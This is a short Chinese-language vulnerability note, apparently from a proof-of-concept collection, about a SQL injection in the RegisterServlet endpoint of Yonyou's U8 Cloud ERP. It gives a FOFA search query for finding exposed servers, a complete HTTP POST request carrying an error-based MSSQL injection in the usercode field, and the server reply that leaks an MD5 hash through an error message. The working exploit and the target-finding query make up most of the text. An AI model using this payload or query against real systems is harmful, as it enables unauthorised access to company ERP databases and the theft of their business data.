## 用友U8-cloud RegisterServlet接口存在SQL注入漏洞
U8 Cloud是用友公司推出的企业上云数字化平台，为成长型和创新型企业提供全面的云ERP解决方案。

U8 cloud不同于传统的ERP，融合了交易、服务、管理于一体的整体解决方案。U8 cloud集中于企业内部管理管控，管理，规范、高效、协同、透明。通过云模式，低成本，快速部署，即租即用的帮助企业免除硬软件投入的快速搭建企业管理架构。通过云服务连接，业务模式、服务模式的经营创新。

该系统RegisterServlet接口存在SQL注入漏洞，并且属于1day状态。

## fofa
```
app="用友-U8-Cloud"
```

## poc
发送下面的poc，响应包返回123456 的md5为存在漏洞
```
POST /servlet/RegisterServlet HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
Connection: close
Content-Length: 85
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip

usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--
```
返回
```
HTTP/1.1 200 OK
Connection: close
Content-Length: 71Date: Mon, 13 Nov 2023 02:25:54 GMT
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=F66A9268A74114BADA7CB11346378B11.server;
Path=/; HttpOnly
Error:?? nvarchar ? 'e10adc3949ba59abbe56e057f20f883e' ??????? int ????
```
